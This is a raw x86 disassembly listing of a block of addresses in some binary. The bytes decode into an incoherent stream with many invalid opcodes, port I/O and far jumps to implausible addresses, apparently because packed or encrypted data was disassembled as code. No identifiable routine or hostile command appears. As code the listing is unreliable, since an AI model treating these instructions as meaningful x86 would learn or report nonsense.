  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x28fbfc2d
  415102:	sub    ch,dl
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0xa6000001
  41510d:	jecxz  0x415113
  41510f:	or     ah,BYTE PTR [ebx+0x53ee2d33]
  415115:	clc    
  415116:	stc    
  415117:	or     bh,ah
  415119:	mov    esp,0xb99d9913
  41511e:	in     eax,0xc
  415120:	(bad)  
  415121:	rol    ebp,cl
  415123:	mov    bh,0x64
  415125:	xchg   DWORD PTR [eax-0x176fb28a],esp
  41512b:	int    0x91
  41512d:	out    dx,al
  41512e:	repnz mov esp,0xf9683482
  415134:	or     BYTE PTR [edi-0x69fc04fa],bl
  41513a:	xor    ebp,DWORD PTR [edi]
  41513c:	ins    DWORD PTR es:[edi],dx
  41513d:	mov    bh,0x24
  41513f:	xor    DWORD PTR [eax-0x29],0xffffffa6
  415143:	enter  0x17e5,0xf9
  415147:	mov    edx,0xe2f9e1ee
  41514c:	int3   
  41514d:	jge    0x415176
  41514f:	pop    edx
  415150:	ss sub eax,0xbe5828c
  415156:	test   al,0x9
  415158:	sbb    DWORD PTR [esp+ebx*8+0x38],edi
  41515c:	idiv   BYTE PTR [esi+0xd]
  41515f:	inc    edi
  415160:	in     eax,0x2c
  415162:	gs xchg edx,eax
  415164:	in     eax,dx
  415165:	retf   0x72cd
  415168:	push   eax
  415169:	cmp    esi,DWORD PTR [ecx+eax*2]
  41516c:	test   DWORD PTR [esi+0x5e],ebp
  41516f:	xchg   edi,eax
  415170:	stos   BYTE PTR es:[edi],al
  415171:	push   ds
  415172:	int    0x10
  415174:	or     DWORD PTR [ebp-0x434a5ed8],0xa180f20a
  41517e:	mov    dl,bl
  415180:	ja     0x41519e
  415182:	pushf  
  415183:	sbb    eax,0x4f72dffe
  415188:	inc    ecx
  415189:	mov    dh,0x37
  41518b:	push   es
  41518c:	xchg   DWORD PTR [esi+0x1c],edx
  41518f:	arpl   WORD PTR [esp+esi*8+0x5f],cx
  415193:	sub    dh,BYTE PTR [edi+0x79]
  415196:	mov    ebx,0x577105f5
  41519b:	push   ss
  41519c:	fistp  WORD PTR [ebx-0x48a1c93b]
  4151a2:	sbb    edx,edi
  4151a4:	ret    0x1fe0
  4151a7:	iret   
  4151a8:	stos   DWORD PTR es:[edi],eax
  4151a9:	stos   BYTE PTR es:[edi],al
  4151aa:	(bad)  
  4151ab:	out    0x44,eax
  4151ad:	out    0x7e,al
  4151af:	out    0x29,eax
  4151b1:	test   eax,eax
  4151b3:	pushf  
  4151b4:	out    0x13,eax
  4151b6:	dec    esp
  4151b7:	retf   0x7071
  4151ba:	xor    al,0x53
  4151bc:	neg    ecx
  4151be:	iret   
  4151bf:	cwde   
  4151c0:	dec    ecx
  4151c1:	sub    ch,cl
  4151c3:	add    ch,BYTE PTR [edi]
  4151c5:	jo     0x415192
  4151c7:	xchg   ecx,eax
  4151c8:	mov    eax,ds:0x981680c8
  4151cd:	in     eax,0x13
  4151cf:	das    
  4151d0:	adc    ebp,DWORD PTR [ebx-0x42e9fc6d]
  4151d6:	shr    BYTE PTR [ebp+0x4c4d5782],1
  4151dc:	mov    DWORD PTR [edi],edi
  4151de:	sub    eax,0xed0cc272
  4151e3:	mov    al,ds:0x8a8a5442
  4151e8:	test   DWORD PTR [ecx+0x42a31a27],edx
  4151ee:	seta   BYTE PTR [ecx]
  4151f1:	jb     0x415224
  4151f3:	into   
  4151f4:	sar    DWORD PTR [edi-0x16],cl
  4151f7:	sub    eax,0x752f9d54
  4151fc:	push   edi
  4151fd:	arpl   ax,bp
  4151ff:	mov    dh,0x91
  415201:	and    ecx,esp
  415203:	fisttp WORD PTR [eax]
  415205:	jne    0x415215
  415207:	scas   al,BYTE PTR es:[edi]
  415208:	mov    ebx,0xdd19f127
  41520d:	and    eax,0x97ace1
	...
  415272:	add    BYTE PTR [eax],al
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x73afc80b
  415283:	xor    al,0x1d
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR ds:0x1f000001,al
  41528d:	mov    esi,0x6dc98f81
  415292:	loopne 0x415282
  415294:	int    0x7e
  415296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415297:	pop    ss
  415298:	inc    ecx
  415299:	sub    BYTE PTR [ecx],dl
  41529b:	and    BYTE PTR [esi+ebp*1],0x48
  41529f:	hlt    
  4152a0:	and    ebx,DWORD PTR [eax+ebx*1-0x1b277df4]
  4152a7:	aaa    
  4152a8:	mov    edx,0xd4b8f8fd
  4152ad:	or     ebx,DWORD PTR [edx]
  4152af:	cli    
  4152b0:	arpl   di,bp
  4152b2:	aam    0xb4
  4152b4:	xchg   BYTE PTR [ebx+edx*1],dl
  4152b7:	push   ebx
  4152b8:	pop    eax
  4152b9:	arpl   WORD PTR [edi],ax
  4152bb:	xor    cl,dh
  4152bd:	pop    esp
  4152be:	arpl   WORD PTR [esi-0x1ac96b02],dx
  4152c4:	add    BYTE PTR ds:0x3e4a6382,al
  4152ca:	imul   edi,DWORD PTR [ecx+0x66],0xcc8f322f
  4152d1:	sbb    al,0xe7
  4152d3:	mov    ds:0x47d7070c,al
  4152d8:	pusha  
  4152d9:	aas    
  4152da:	pop    esi
  4152db:	sar    DWORD PTR [eax],cl
  4152dd:	or     eax,0x7c0e26e8
  4152e2:	or     esi,ebp
  4152e4:	mov    cl,0xb5
  4152e6:	and    DWORD PTR [edi-0x2a],0xffffffbd
  4152ea:	xor    eax,0x39f8cead
  4152ef:	popa   
  4152f0:	mov    ebp,DWORD PTR [eax+0x1d]
  4152f3:	lds    eax,FWORD PTR [ecx+ecx*2-0x1ecee561]
  4152fa:	sbb    al,0x38
  4152fc:	add    al,0x59
  4152fe:	sbb    BYTE PTR [edi+0x6ab227d0],dl
  415304:	inc    edi
  415305:	and    eax,0x29d1d2a1
  41530a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41530b:	cmp    DWORD PTR [esi+0x5642a6c9],edx
  415311:	es sbb ch,al
  415314:	sub    al,0x43
  415316:	test   DWORD PTR [edx+0x3e],edx
  415319:	loope  0x4152e2
  41531b:	aaa    
  41531c:	inc    edx
  41531d:	push   edi
  41531e:	xchg   edx,eax
  41531f:	inc    esi
  415320:	push   eax
  415321:	sti    
  415322:	mov    al,0x2b
  415324:	lds    edi,FWORD PTR [edx]
  415326:	cmp    BYTE PTR [ebx-0x6f642016],dl
  41532c:	mov    edi,0xfd23818a
  415331:	jmp    0x9557119f
  415336:	xlat   BYTE PTR ds:[ebx]
  415337:	inc    esi
  415338:	popf   
  415339:	xchg   ecx,eax
  41533a:	mov    ebx,0x795bace
  41533f:	je     0x415385
  415341:	push   eax
  415342:	in     eax,0x42
  415344:	stos   BYTE PTR es:[edi],al
  415345:	scas   al,BYTE PTR es:[edi]
  415346:	cmp    BYTE PTR [ebx+0x50],cl
  415349:	dec    esp
  41534a:	mov    dl,dh
  41534c:	mov    bl,0xdb
  41534e:	and    ebp,DWORD PTR [edi-0x6c]
  415351:	or     DWORD PTR [ecx],edx
  415353:	adc    DWORD PTR [eax-0x248dbc2b],eax
  415359:	scas   eax,DWORD PTR es:[edi]
  41535a:	out    0x21,eax
  41535c:	adc    eax,0x5feda47b
  415361:	add    BYTE PTR [edi-0x57],0x81
  415365:	jle    0x41532e
  415367:	or     edx,0xb5ba94b4
  41536d:	out    0x14,eax
  41536f:	push   0x58b661a5
  415374:	jo     0x4153e9
  415376:	ret    0x30e0
  415379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41537a:	xor    eax,0x8a988e4
  41537f:	add    BYTE PTR [edx+0x4d7caa3d],al
  415385:	retf   0x5b73
  415388:	data16 addr16 (bad) 
  41538b:	adc    edi,DWORD PTR [edi-0x49]
  41538e:	loope  0x415402
  415390:	ins    DWORD PTR es:[edi],dx
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x6fd3e5b0
  415401:	loopne 0x415470
  415403:	pop    es
  415404:	and    ah,al
  415406:	add    BYTE PTR [eax],al
  415408:	add    eax,0xe5000001
  41540d:	int    0xad
  41540f:	sub    BYTE PTR [ecx-0x11],ah
  415412:	sti    
  415413:	pop    es
  415414:	in     eax,dx
  415415:	sub    al,0x9b
  415417:	add    eax,0xe96ac30c
  41541c:	xchg   esp,eax
  41541d:	xchg   esp,eax
  41541e:	push   ecx
  41541f:	pushf  
  415420:	rcr    DWORD PTR [eax+0x1d],1
  415423:	jns    0x4153eb
  415425:	pop    edi
  415426:	stc    
  415427:	and    eax,esp
  415429:	jns    0x4153c1
  41542b:	cmp    BYTE PTR [ebx-0x919ef09],bl
  415431:	retf   0xb2c4
  415434:	je     0x4153ea
  415436:	inc    edi
  415437:	icebp  
  415438:	lods   ax,WORD PTR ds:[esi]
  41543a:	inc    ebx
  41543b:	fiadd  WORD PTR [ebx+ecx*2+0x26abe6e5]
  415442:	adc    DWORD PTR [ebp+0x55],edx
  415445:	pop    ebx
  415446:	mov    cl,0x3a
  415448:	or     DWORD PTR [edx-0x2f3b864d],ebx
  41544e:	sbb    esp,esi
  415450:	repz adc BYTE PTR [ebx+0x74],ah
  415454:	jne    0x4154a0
  415456:	cmp    DWORD PTR [edx],ebp
  415458:	pop    DWORD PTR [eax-0x14]
  41545b:	rcr    DWORD PTR ds:0x38852b39,0x7a
  415462:	test   al,0x86
  415464:	mov    esp,DWORD PTR [eax+edx*8+0x3a]
  415468:	fnstsw WORD PTR [ebx+0x54]
  41546b:	mov    ebp,0xc2db03c
  415470:	loop   0x4154c0
  415472:	(bad)  
  415473:	and    eax,0xd082e0f0
  415478:	fld    DWORD PTR [esi]
  41547a:	xor    al,bl
  41547c:	push   cs
  41547d:	jecxz  0x4154a2
  41547f:	sbb    bl,BYTE PTR [edx-0xa2e1d08]
  415485:	sub    BYTE PTR [ecx-0x4340d402],ah
  41548b:	cmc    
  41548c:	test   bl,ch
  41548e:	into   
  41548f:	jmp    0x4154ac
  415491:	ds loopne 0x41550b
  415494:	ss clc 
  415496:	sbb    bh,ah
  415498:	rcr    BYTE PTR [edx],cl
  41549a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41549b:	bound  esp,QWORD PTR [ebx+edi*2+0x48]
  41549f:	pop    ebx
  4154a0:	outs   dx,DWORD PTR ds:[esi]
  4154a1:	jp     0x415473
  4154a3:	(bad)  
  4154a4:	jb     0x415490
  4154a6:	imul   eax,DWORD PTR [eax+ebx*4],0x2e
  4154aa:	xor    DWORD PTR [edi+0x1a945c31],esi
  4154b0:	xlat   BYTE PTR ds:[ebx]
  4154b1:	rcl    DWORD PTR cs:[edx-0x49],cl
  4154b5:	fidivr DWORD PTR [ebx]
  4154b7:	div    BYTE PTR [ebp-0x15]
  4154ba:	or     cl,BYTE PTR [edi*8+0x7a79b918]
  4154c1:	sub    DWORD PTR [edx+eax*8-0x75],ecx
  4154c5:	xor    BYTE PTR [eax+0x1],ah
  4154c8:	aaa    
  4154c9:	inc    edi
  4154ca:	sub    BYTE PTR [esi+0x92309a4],0x29
  4154d1:	(bad)  
  4154d2:	iret   
  4154d3:	into   
  4154d4:	repnz and al,0x8c
  4154d7:	mov    ch,0x4f
  4154d9:	lods   al,BYTE PTR ds:[esi]
  4154da:	(bad)  [ecx+0x4]
  4154dd:	mov    WORD PTR [edi+0x33155fc7],es
  4154e3:	jnp    0x4154df
  4154e5:	jg     0x4154f1
  4154e7:	pop    eax
  4154e8:	pop    es
  4154e9:	push   0x17
  4154eb:	int3   
  4154ec:	lods   eax,DWORD PTR ds:[esi]
  4154ed:	sbb    esp,ecx
  4154ef:	xor    al,0xe1
  4154f1:	ret    0x7bbd
  4154f4:	aaa    
  4154f5:	inc    ebx
  4154f6:	test   al,0x2a
  4154f8:	adc    ecx,DWORD PTR [edi-0x54]
  4154fb:	das    
  4154fc:	fiadd  DWORD PTR [esi+0x12c32ef2]
  415502:	scas   eax,DWORD PTR es:[edi]
  415503:	xchg   ebp,eax
  415504:	loop   0x41548b
  415506:	cmp    cl,BYTE PTR [esi+eax*4]
  415509:	mov    ss,WORD PTR [edi]
  41550b:	nop
  41550c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41550d:	dec    eax
  41550e:	mov    esi,0x7025
	...
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155b2
  415581:	mulps  xmm6,XMMWORD PTR [esi+0xe127]
  415588:	add    eax,0xe3000001
  41558d:	fwait
  41558e:	add    al,ch
  415590:	mov    cl,0x97
  415592:	jb     0x4155de
  415594:	mov    al,0xad
  415596:	add    BYTE PTR [edi+edx*8-0x6],bh
  41559a:	adc    al,0xb
  41559c:	pop    edi
  41559d:	dec    ebx
  41559e:	dec    ebx
  41559f:	fisub  DWORD PTR [esi+0x61e56b62]
  4155a5:	pop    es
  4155a6:	out    dx,eax
  4155a7:	hlt    
  4155a8:	or     DWORD PTR [edx],0xffffffd1
  4155ab:	je     0x4155c0
  4155ad:	lock lea ecx,cs:[ebx+0x1c66b42]
  4155b5:	jmp    0xae82742e
  4155ba:	cmp    ebx,eax
  4155bc:	fs pop esi
  4155be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155bf:	mov    esp,DWORD PTR ds:0xb31d16af
  4155c5:	cvtps2pi mm1,QWORD PTR [ebp+0x8731c70]
  4155cc:	or     BYTE PTR [ecx+0x6a],al
  4155cf:	sub    eax,0x573754b3
  4155d4:	into   
  4155d5:	sub    DWORD PTR [ecx*1+0x40adc7c9],0x3e28b598
  4155e0:	sahf   
  4155e1:	sbb    eax,ebp
  4155e3:	int    0x33
  4155e5:	mov    ch,0x8e
  4155e7:	das    
  4155e8:	mov    al,0x32
  4155ea:	or     al,0xa5
  4155ec:	mov    al,cs:0x2de336f3
  4155f2:	cwde   
  4155f3:	mov    dh,0xc5
  4155f5:	aaa    
  4155f6:	inc    edx
  4155f7:	(bad)  
  4155f8:	jb     0x41562c
  4155fa:	add    eax,0xbc81b847
  4155ff:	outs   dx,DWORD PTR ds:[esi]
  415600:	fwait
  415601:	in     al,dx
  415602:	xchg   BYTE PTR [edi],bl
  415604:	and    al,BYTE PTR [esi]
  415606:	xchg   esi,eax
  415607:	popa   
  415608:	jns    0x41567a
  41560a:	cmp    al,0x3d
  41560c:	push   edi
  41560d:	ds mov eax,0xd05fedba
  415613:	inc    edi
  415614:	daa    
  415615:	add    eax,0xcd998e81
  41561a:	dec    esp
  41561b:	hlt    
  41561c:	push   0xffffffe9
  41561e:	adc    esp,0xffffffa0
  415621:	adc    eax,0xd2c4034b
  415626:	mov    ecx,0xe65d1e27
  41562b:	lea    edx,fs:[ebp+ebx*2+0x1c]
  415630:	push   esp
  415631:	call   FWORD PTR [ecx+0x2dd59ac9]
  415637:	sub    dl,0xb
  41563a:	push   esp
  41563b:	mov    esp,0xa44926d1
  415640:	test   eax,0xa1e189f5
  415645:	mov    ds:0x3b17ee17,al
  41564a:	jmp    0x94d6979b
  41564f:	inc    ecx
  415650:	xchg   esp,eax
  415651:	loope  0x4156c4
  415653:	or     BYTE PTR [ebp-0x714a8077],al
  415659:	jp     0x415612
  41565b:	inc    esi
  41565c:	icebp  
  41565d:	int    0x36
  41565f:	shr    DWORD PTR [esi],cl
  415661:	cmc    
  415662:	adc    eax,0x897a64cc
  415667:	das    
  415668:	std    
  415669:	mov    esp,0xbcb3396f
  41566e:	xor    eax,0xb2e1da32
  415673:	dec    edx
  415674:	jns    0x4156f3
  415676:	inc    ebp
  415677:	pop    ecx
  415678:	jb     0x4156a0
  41567a:	out    dx,eax
  41567b:	xchg   edx,eax
  41567c:	jmp    0xbbbdbe11
  415681:	xchg   esp,eax
  415682:	mov    al,0xfe
  415684:	mov    dh,0x3
  415686:	and    eax,0xdde7bfbf
  41568b:	shl    DWORD PTR [eax-0x3b0f5],cl
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	sti    
  415701:	xchg   esp,eax
  415702:	mov    ch,0xd4
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0xe4000001
  41570d:	retf   0x32ed
  415710:	bound  ecx,QWORD PTR [esi-0x37a312b0]
  415716:	mov    ch,0xfe
  415718:	loop   0x41574e
  41571a:	mov    eax,ds:0xad9769d2
  41571f:	xor    eax,0x865c2f4a
  415724:	jmp    0x2f12:0x1ffee62f
  41572b:	lods   eax,DWORD PTR ds:[esi]
  41572c:	dec    esi
  41572d:	sbb    ch,ah
  41572f:	sbb    eax,0x742bb386
  415734:	test   bl,cl
  415736:	(bad)  
  415737:	mov    eax,0x109b1581
  41573c:	ret    0xebfc
  41573f:	pop    esp
  415740:	ja     0x41578a
  415742:	ss sub al,0x5d
  415745:	mov    bh,0xb1
  415747:	in     eax,dx
  415748:	mov    bh,0x2d
  41574a:	pop    ebp
  41574b:	xor    BYTE PTR [eax+edi*4-0xd],dh
  41574f:	push   0x547eb3c7
  415754:	xchg   esi,eax
  415755:	jne    0x4156ff
  415757:	sub    ebx,DWORD PTR [edi-0x2634db1e]
  41575d:	fld    st(3)
  41575f:	(bad)  
  415760:	test   eax,0x921581d2
  415765:	xor    ecx,DWORD PTR [esp+eax*2+0x31]
  415769:	dec    edi
  41576a:	jo     0x4157c7
  41576c:	mov    ebp,0x7f8cdd69
  415771:	adc    eax,0x1c3df4da
  415776:	stc    
  415777:	aad    0x9
  415779:	sbb    edi,eax
  41577b:	adc    BYTE PTR [eax],cl
  41577d:	mov    gs,WORD PTR [esi+0x1e]
  415780:	mov    al,ds:0x2b32f7c0
  415785:	jmp    0x18b3:0x1dcf9233
  41578c:	bound  eax,QWORD PTR [edi-0x258a1c0b]
  415792:	jmp    0xbaa2c71b
  415797:	add    cl,ch
  415799:	jmp    0x9e25:0xbcd07fca
  4157a0:	hlt    
  4157a1:	xchg   esp,eax
  4157a2:	jne    0x4157f1
  4157a4:	adc    eax,DWORD PTR [ebx+0x5c]
  4157a7:	gs jne 0x415748
  4157aa:	jnp    0x4157d4
  4157ac:	adc    esp,DWORD PTR [eax]
  4157ae:	jecxz  0x4157af
  4157b0:	(bad)  
  4157b1:	daa    
  4157b2:	stc    
  4157b3:	les    ecx,FWORD PTR [edi]
  4157b5:	mov    ecx,0x5d68cda8
  4157ba:	mov    dh,0x6a
  4157bc:	cmp    BYTE PTR [ebx],bh
  4157be:	daa    
  4157bf:	ret    0xb139
  4157c2:	cmc    
  4157c3:	and    BYTE PTR [ebp+0x6d02baa9],al
  4157c9:	outs   dx,BYTE PTR ds:[esi]
  4157ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cb:	fisubr WORD PTR [ecx+ecx*1]
  4157ce:	and    ecx,DWORD PTR [edx+0x33]
  4157d1:	mov    ch,0x7e
  4157d3:	lea    ebp,[ebp-0x3b0ea693]
  4157d9:	aam    0xcd
  4157db:	add    ecx,DWORD PTR es:[ebp-0x5565de86]
  4157e2:	mov    esp,0x81ef2751
  4157e7:	test   eax,0x8337ca20
  4157ec:	(bad)  
  4157ed:	jge    0x415796
  4157ef:	mov    eax,0x904f907f
  4157f4:	fldcw  WORD PTR [esi]
  4157f6:	xchg   ebp,eax
  4157f7:	cs cmp ch,dl
  4157fa:	popa   
  4157fb:	adc    eax,0xee82791f
  415800:	icebp  
  415801:	pop    edx
  415802:	dec    esi
  415803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415804:	mov    ebx,0x2af306fe
  415809:	aad    0x1
  41580b:	mov    ah,0x18
  41580d:	mov    eax,ds:0x8bc107
	...
  415872:	add    BYTE PTR [eax],al
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcl    ebp,cl
  415881:	or     BYTE PTR [ecx-0x5],dh
  415884:	xor    ebx,esp
  415886:	add    BYTE PTR [eax],al
  415888:	add    eax,0x76000001
  41588d:	(bad)  
  41588f:	stc    
  415890:	pushf  
  415891:	inc    eax
  415892:	jo     0x4158dc
  415894:	mov    dh,0x66
  415896:	inc    ebp
  415897:	add    cl,BYTE PTR [edi-0x2cb78a32]
  41589d:	sbb    eax,0xdf0434c9
  4158a2:	enter  0xd300,0xaf
  4158a6:	sbb    DWORD PTR [eax-0x3b],esp
  4158a9:	pop    es
  4158aa:	and    esi,edx
  4158ac:	pop    edx
  4158ad:	retf   0x70af
  4158b0:	and    al,0x9d
  4158b2:	xchg   DWORD PTR [edx+eiz*4-0x1f],edx
  4158b6:	cmp    DWORD PTR [edx-0x20],ecx
  4158b9:	aaa    
  4158ba:	or     cl,BYTE PTR ds:0x59f5a015
  4158c0:	and    al,0xaa
  4158c2:	bound  edi,QWORD PTR [edi-0x778c089c]
  4158c8:	fidivr WORD PTR [esi-0x59cb6f34]
  4158ce:	push   cs
  4158cf:	adc    ebp,DWORD PTR [eax+0x361c26cc]
  4158d5:	in     al,0xb3
  4158d7:	fwait
  4158d8:	test   BYTE PTR [ebx+0x4f1f447],ah
  4158de:	mov    BYTE PTR [ebx],ah
  4158e0:	xor    BYTE PTR [edi+0x53],al
  4158e3:	or     al,0xd0
  4158e5:	das    
  4158e6:	mov    fs,WORD PTR [ebx+0x78]
  4158e9:	mov    eax,0x7f47df32
  4158ee:	mov    edx,0xfe98bc2c
  4158f3:	push   ds
  4158f4:	sti    
  4158f5:	sub    eax,DWORD PTR [edi-0x693ed05d]
  4158fb:	jnp    0x415889
  4158fd:	push   ss
  4158fe:	adc    dh,bh
  415900:	mov    al,ds:0x243392eb
  415905:	(bad)  
  415906:	jbe    0x415947
  415908:	enter  0xf9f2,0x91
  41590c:	sbb    edi,ebp
  41590e:	add    eax,0xab139ba7
  415913:	dec    ecx
  415914:	and    al,0x9c
  415916:	outs   dx,DWORD PTR ds:[esi]
  415917:	pop    esi
  415918:	xchg   ebx,eax
  415919:	in     eax,dx
  41591a:	ror    ebp,cl
  41591c:	or     al,0xcd
  41591e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41591f:	sub    ah,al
  415921:	mov    ch,0x6f
  415923:	int3   
  415924:	addr16 adc bh,0x3a
  415928:	xor    eax,0x7382768c
  41592d:	inc    ebp
  41592e:	clc    
  41592f:	jl     0x41593f
  415931:	mov    eax,ds:0x89c49a1a
  415936:	jb     0x41595c
  415938:	enter  0xf0fa,0x61
  41593c:	add    eax,0xe51b4c8b
  415941:	add    eax,0x281e04ef
  415946:	cmp    ebx,DWORD PTR [ebx-0x7f5210c1]
  41594c:	aas    
  41594d:	mov    dl,0x4d
  41594f:	xchg   ebp,eax
  415950:	cmp    BYTE PTR [eax+0x6a],ah
  415953:	pop    ebx
  415954:	adc    eax,0x770abe44
  415959:	add    ecx,DWORD PTR [eax+0x6a]
  41595c:	ds mov edx,0x82187f44
  415962:	call   0x6405:0x98406f91
  415969:	add    al,0x17
  41596b:	bound  edi,QWORD PTR [eax]
  41596d:	push   cs
  41596e:	add    BYTE PTR [ebx],cl
  415970:	(bad)  
  415971:	push   edi
  415972:	ds clc 
  415974:	pop    edi
  415975:	(bad)  
  415976:	mov    ds:0x3001d4aa,al
  41597b:	push   ss
  41597c:	mov    DWORD PTR [ebp+0x31],ebp
  41597f:	leave  
  415980:	std    
  415981:	mov    edx,0x5db64fd6
  415986:	add    BYTE PTR [ecx+0x70],dl
  415989:	ja     0x41599a
  41598b:	call   0xbe7085f4
  415990:	push   esi
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	inc    esi
  415a01:	sbb    DWORD PTR [esi],esp
  415a03:	ins    BYTE PTR es:[edi],dx
  415a04:	ss in  al,0x0
  415a07:	add    BYTE PTR ds:0xc5000001,al
  415a0d:	pusha  
  415a0e:	sub    ebp,DWORD PTR [ebp-0x21]
  415a11:	mov    dl,0x7a
  415a13:	pop    ds
  415a14:	xchg   edi,eax
  415a15:	push   ds
  415a16:	test   al,0xa6
  415a18:	ret    
  415a19:	pop    eax
  415a1a:	scas   eax,DWORD PTR es:[edi]
  415a1b:	test   al,0xf4
  415a1d:	ror    BYTE PTR [eax],1
  415a1f:	int3   
  415a20:	je     0x415a99
  415a22:	inc    eax
  415a23:	fxch   st(3)
  415a25:	mov    bh,0x52
  415a27:	sub    al,0x93
  415a29:	mov    eax,ds:0x4bfa740f
  415a2e:	ja     0x4159b9
  415a30:	jb     0x4159da
  415a32:	shl    DWORD PTR [esi],cl
  415a34:	(bad)  
  415a36:	popf   
  415a37:	mov    ch,0x52
  415a39:	sub    eax,0x28092967
  415a3e:	aad    0x98
  415a40:	adc    eax,0xb5c551fa
  415a45:	fs mov bl,0x28
  415a48:	or     BYTE PTR [edx-0x4b7823],dh
  415a4e:	lea    edx,[esi+0x69]
  415a51:	and    BYTE PTR [edi-0x4f17c25c],bl
  415a57:	mov    cl,bh
  415a59:	pop    edx
  415a5a:	add    BYTE PTR [ebp-0x29],ch
  415a5d:	out    0x8,eax
  415a5f:	vandps xmm0,xmm0,XMMWORD PTR [esi+0x20]
  415a65:	retf   
  415a66:	cdq    
  415a67:	mov    ebx,0x9be15bf1
  415a6c:	xchg   edx,eax
  415a6d:	add    BYTE PTR [esi+edi*2],0x44
  415a71:	mov    ecx,0xdcfa5e01
  415a76:	inc    ebx
  415a77:	test   al,0x8e
  415a79:	call   0xc9e7c2cf
  415a7e:	loope  0x415a73
  415a80:	mov    esi,DWORD PTR [ebx]
  415a82:	inc    esi
  415a83:	xor    ebx,edx
  415a85:	mov    ecx,0x703f8cc2
  415a8a:	clc    
  415a8b:	sbb    eax,0xe180e9c8
  415a90:	jo     0x415a15
  415a92:	xor    eax,0x40530646
  415a97:	sub    esi,DWORD PTR [esi-0x1a]
  415a9a:	rcl    esi,1
  415a9c:	stc    
  415a9d:	(bad)  
  415a9e:	cmp    eax,0x87f02183
  415aa3:	and    ch,dl
  415aa5:	and    BYTE PTR [ebx+esi*2+0x73026dff],0x14
  415aad:	pop    esp
  415aae:	out    0x46,al
  415ab0:	push   cs
  415ab1:	mov    cl,0xf7
  415ab3:	push   ebx
  415ab4:	jbe    0x415a39
  415ab6:	push   0x9cb0a585
  415abb:	mov    ah,0xc6
  415abd:	scas   eax,DWORD PTR es:[edi]
  415abe:	sub    al,0x46
  415ac0:	pop    eax
  415ac1:	cmc    
  415ac2:	sar    edi,cl
  415ac4:	dec    ecx
  415ac5:	loopne 0x415a92
  415ac7:	xchg   bl,cl
  415ac9:	in     al,0x7c
  415acb:	push   ecx
  415acc:	shl    edi,1
  415ace:	lds    edi,FWORD PTR [ecx+0x52]
  415ad1:	inc    BYTE PTR [esi-0x624f1c50]
  415ad7:	jge    0x415a64
  415ad9:	pop    ss
  415ada:	mov    dh,0x8f
  415adc:	loopne 0x415aea
  415ade:	dec    edi
  415adf:	pop    ebx
  415ae0:	dec    ecx
  415ae1:	sbb    DWORD PTR [ebp-0x43],0x5f
  415ae5:	jmp    0xe044:0xc1429bca
  415aec:	or     al,0x9d
  415aee:	pop    esi
  415aef:	sahf   
  415af0:	mov    ds:0x544087bc,eax
  415af5:	(bad)  
  415af7:	cmp    DWORD PTR [edi+0x19],esp
  415afa:	popf   
  415afb:	push   ecx
  415afc:	push   cs
  415afd:	ja     0x415b49
  415aff:	mov    cl,BYTE PTR [edi-0x46]
  415b02:	bound  ecx,QWORD PTR [ebp+ecx*4+0x76e3b369]
  415b09:	call   0x8c981cb2
  415b0e:	mov    dl,0xd7
  415b10:	inc    ebp
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fmul   QWORD PTR [esp+ebp*1+0x73]
  415b83:	arpl   WORD PTR [ebx],di
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0xc1000001,al
  415b8d:	test   BYTE PTR [edx+0x32],0x53
  415b91:	bnd call 0x123986dd
  415b97:	lds    ebp,FWORD PTR ds:0xde043377
  415b9d:	ror    BYTE PTR [eax],cl
  415b9f:	lar    ebp,WORD PTR [edx-0x1f118903]
  415ba6:	les    edi,FWORD PTR [ebx-0x5f]
  415ba9:	in     eax,dx
  415baa:	stos   DWORD PTR es:[edi],eax
  415bab:	in     al,0x0
  415bad:	mov    DWORD PTR [edi+eiz*8],ecx
  415bb0:	nop
  415bb1:	jmp    0x67c038ba
  415bb6:	push   ds
  415bb7:	add    BYTE PTR [eax-0x37],dh
  415bba:	mov    esp,0x9b0ec971
  415bbf:	sar    ecx,0xa3
  415bc2:	das    
  415bc3:	addr16 or eax,0xa794bd17
